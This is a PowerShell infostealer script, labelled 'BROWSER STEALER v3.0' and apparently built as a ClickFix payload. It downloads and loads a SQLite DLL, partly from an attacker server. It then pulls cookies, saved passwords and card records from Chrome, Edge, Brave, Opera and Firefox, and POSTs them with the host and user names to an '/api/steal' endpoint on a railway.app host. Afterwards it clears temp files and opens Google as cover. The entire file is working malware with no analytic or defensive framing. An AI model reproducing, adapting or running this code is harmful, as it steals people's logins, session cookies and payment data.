# ============================================================
# BROWSER STEALER — SIMPLE WORKING VERSION
# Downloads SQLite DLL directly (no NuGet extraction)
# ============================================================

$ErrorActionPreference = "Continue"
$SERVER_URL = "https://cipheranon-production.up.railway.app/api/steal"
$LOGFILE = "$env:TEMP\stealer_log.txt"

# Clear log
Remove-Item $LOGFILE -Force -ErrorAction SilentlyContinue

function Write-Log {
    param($Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $line = "[$timestamp] $Msg"
    Add-Content -Path $LOGFILE -Value $line
    Write-Host $Msg
}

Write-Log "============================================"
Write-Log "  BROWSER STEALER v3.0"
Write-Log "  Target: $env:COMPUTERNAME"
Write-Log "  Log: $LOGFILE"
Write-Log "============================================"
Write-Log ""

# ============================================================
# DOWNLOAD SQLITE DLL DIRECTLY
# ============================================================

$dllPath = "$env:TEMP\SQLite.dll"

# Try to load from temp first
if (Test-Path $dllPath) {
    Write-Log "[+] SQLite DLL found in temp"
    try {
        [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
        Write-Log "[+] SQLite loaded from temp!"
        $sqliteLoaded = $true
    } catch {
        Write-Log "[!] Failed to load from temp: $_"
        Remove-Item $dllPath -Force -ErrorAction SilentlyContinue
        $sqliteLoaded = $false
    }
} else {
    $sqliteLoaded = $false
}

# Download if not loaded
if (-not $sqliteLoaded) {
    Write-Log "[+] Downloading SQLite DLL..."
    
    # Try multiple reliable sources
    $urls = @(
        "https://raw.githubusercontent.com/ackara/System.Data.SQLite/master/System.Data.SQLite.dll",
        "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
    )
    
    $downloaded = $false
    foreach ($url in $urls) {
        Write-Log "[+] Trying: $url"
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            $webClient.DownloadFile($url, $dllPath)
            
            if (Test-Path $dllPath -and (Get-Item $dllPath).Length -gt 10000) {
                Write-Log "[+] Downloaded: $((Get-Item $dllPath).Length) bytes"
                [System.Reflection.Assembly]::LoadFrom($dllPath) | Out-Null
                Write-Log "[+] SQLite loaded successfully!"
                $downloaded = $true
                $sqliteLoaded = $true
                break
            }
        } catch {
            Write-Log "[!] Failed: $_"
        }
    }
    
    if (-not $downloaded) {
        Write-Log "[!] Failed to download SQLite from all sources"
    }
}

# ============================================================
# FALLBACK: Try built-in SQLite
# ============================================================

if (-not $sqliteLoaded) {
    Write-Log "[+] Trying Microsoft.Data.Sqlite..."
    try {
        Add-Type -AssemblyName "Microsoft.Data.Sqlite" -ErrorAction Stop
        $sqliteLoaded = $true
        $isMicrosoft = $true
        Write-Log "[+] Microsoft.Data.Sqlite loaded!"
    } catch {
        Write-Log "[!] Microsoft.Data.Sqlite not available"
        $isMicrosoft = $false
    }
}

if (-not $sqliteLoaded) {
    Write-Log "[!] No SQLite available"
    Write-Log "[!] Check internet connection"
    Write-Log "[!] Log saved to: $LOGFILE"
    Read-Host "Press Enter to exit"
    exit
}

# ============================================================
# SQLITE READER
# ============================================================

function Read-SQLite {
    param($DbPath, $Query)
    $result = @()
    if (-not (Test-Path $DbPath)) { return $result }
    try {
        $temp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).tmp"
        Copy-Item $DbPath $temp -Force
        
        if ($isMicrosoft) {
            $conn = New-Object Microsoft.Data.Sqlite.SqliteConnection("Data Source=$temp")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $result += $row
            }
            $rdr.Close()
            $conn.Close()
        } else {
            $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$temp;Version=3;")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $Query
            $rdr = $cmd.ExecuteReader()
            while ($rdr.Read()) {
                $row = @{}
                for ($i=0; $i -lt $rdr.FieldCount; $i++) {
                    $n = $rdr.GetName($i)
                    $v = $rdr.GetValue($i)
                    if ($v -ne $null) { $row[$n] = $v }
                }
                $result += $row
            }
            $rdr.Close()
            $conn.Close()
        }
        Remove-Item $temp -Force -ErrorAction SilentlyContinue
    } catch {}
    return $result
}

# ============================================================
# COOKIE STEALER
# ============================================================

function Get-BrowserCookies {
    param($Path, $Name)
    $cookies = @()
    if (-not (Test-Path $Path)) { return $cookies }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT host_key, name, value FROM cookies"
        foreach ($r in $rows) {
            if ($r['name'] -and $r['value']) {
                $d = $r['host_key']
                if ($d) { $d = $d -replace '^\.', '' } else { $d = "unknown" }
                $cookies += @{ domain = $d; name = $r['name']; value = $r['value']; browser = $Name }
            }
        }
    } catch {}
    return $cookies
}

function Get-FirefoxCookies {
    $cookies = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\cookies.sqlite"
            if (Test-Path $f) {
                try {
                    $rows = Read-SQLite -DbPath $f -Query "SELECT host, name, value FROM moz_cookies"
                    foreach ($r in $rows) {
                        if ($r['name'] -and $r['value']) {
                            $dmn = $r['host']
                            if ($dmn) { $dmn = $dmn -replace '^\.', '' } else { $dmn = "unknown" }
                            $cookies += @{ domain = $dmn; name = $r['name']; value = $r['value']; browser = "Firefox" }
                        }
                    }
                } catch {}
            }
        }
    }
    return $cookies
}

# ============================================================
# PASSWORD STEALER
# ============================================================

function Get-BrowserPasswords {
    param($Path, $Name)
    $pass = @()
    if (-not (Test-Path $Path)) { return $pass }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT origin_url, username_value, password_value FROM logins"
        foreach ($r in $rows) {
            if ($r['username_value'] -and $r['password_value']) {
                $u = $r['origin_url']
                if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                $pass += @{ url = $u; username = $r['username_value']; password = $r['password_value']; browser = $Name }
            }
        }
    } catch {}
    return $pass
}

function Get-FirefoxPasswords {
    $pass = @()
    $profPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $profPath) {
        $dirs = Get-ChildItem $profPath -Directory
        foreach ($d in $dirs) {
            $f = "$($d.FullName)\logins.json"
            if (Test-Path $f) {
                try {
                    $json = Get-Content $f -Raw | ConvertFrom-Json
                    if ($json.logins) {
                        foreach ($l in $json.logins) {
                            $u = $l.hostname
                            if ($u) { $u = $u -replace 'https?://', '' } else { $u = "unknown" }
                            $pass += @{ url = $u; username = $l.username; password = $l.password; browser = "Firefox" }
                        }
                    }
                } catch {}
            }
        }
    }
    return $pass
}

# ============================================================
# CREDIT CARD STEALER
# ============================================================

function Get-BrowserCards {
    param($Path, $Name)
    $cards = @()
    if (-not (Test-Path $Path)) { return $cards }
    try {
        $rows = Read-SQLite -DbPath $Path -Query "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards"
        foreach ($r in $rows) {
            if ($r['name_on_card'] -and $r['card_number_encrypted']) {
                $cards += @{
                    name = $r['name_on_card']
                    number = $r['card_number_encrypted']
                    month = $r['expiration_month']
                    year = $r['expiration_year']
                    browser = $Name
                }
            }
        }
    } catch {}
    return $cards
}

# ============================================================
# STEAL EVERYTHING
# ============================================================

$allCookies = @()
$allPasswords = @()
$allCards = @()

# Cookies
Write-Log "[+] Chrome cookies..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Chrome"

Write-Log "[+] Edge cookies..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Edge"

Write-Log "[+] Brave cookies..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Brave"

Write-Log "[+] Opera cookies..."
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Network\Cookies"
$allCookies += Get-BrowserCookies -Path $path -Name "Opera"

Write-Log "[+] Firefox cookies..."
$allCookies += Get-FirefoxCookies

# Passwords
Write-Log "[+] Chrome passwords..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Chrome"

Write-Log "[+] Edge passwords..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Edge"

Write-Log "[+] Brave passwords..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Brave"

Write-Log "[+] Opera passwords..."
$path = "$env:LOCALAPPDATA\Opera Software\Opera Stable\Login Data"
$allPasswords += Get-BrowserPasswords -Path $path -Name "Opera"

Write-Log "[+] Firefox passwords..."
$allPasswords += Get-FirefoxPasswords

# Cards
Write-Log "[+] Chrome cards..."
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Chrome"

Write-Log "[+] Edge cards..."
$path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Edge"

Write-Log "[+] Brave cards..."
$path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Web Data"
$allCards += Get-BrowserCards -Path $path -Name "Brave"

# ============================================================
# SUMMARY
# ============================================================

Write-Log ""
Write-Log "============================================"
Write-Log "  SUMMARY"
Write-Log "============================================"
Write-Log "Cookies:    $($allCookies.Count)"
Write-Log "Passwords:  $($allPasswords.Count)"
Write-Log "Cards:      $($allCards.Count)"
Write-Log "============================================"
Write-Log ""

if ($allCookies.Count -eq 0 -and $allPasswords.Count -eq 0 -and $allCards.Count -eq 0) {
    Write-Log "[!] No data stolen!"
    Write-Log "[*] Possible reasons:"
    Write-Log "  - No saved passwords/cookies in browsers"
    Write-Log "  - Browser is running (locks the database)"
    Write-Log "  - Close the browser and try again"
    Write-Log ""
}

# ============================================================
# SEND TO SERVER
# ============================================================

$payload = @{
    cookies = $allCookies
    passwords = $allPasswords
    cards = $allCards
    system = @{
        hostname = $env:COMPUTERNAME
        username = $env:USERNAME
    }
    source = "clickfix_payload"
    timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    pcName = $env:COMPUTERNAME
}

Write-Log "[+] Sending data to server..."
try {
    $json = $payload | ConvertTo-Json -Depth 10
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
    $req = [System.Net.WebRequest]::Create($SERVER_URL)
    $req.Method = "POST"
    $req.ContentType = "application/json"
    $req.ContentLength = $bytes.Length
    $stream = $req.GetRequestStream()
    $stream.Write($bytes, 0, $bytes.Length)
    $stream.Close()
    $resp = $req.GetResponse()
    $resp.Close()
    Write-Log "[+] Data sent successfully!"
} catch {
    Write-Log "[!] Failed to send: $_"
}

# ============================================================
# CLEANUP
# ============================================================

Get-ChildItem "$env:TEMP\*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue

Start-Process "https://www.google.com"

Write-Log ""
Write-Log "[+] Done!"
Write-Log "[+] Log saved to: $LOGFILE"
Write-Log ""
Read-Host "Press Enter to exit"
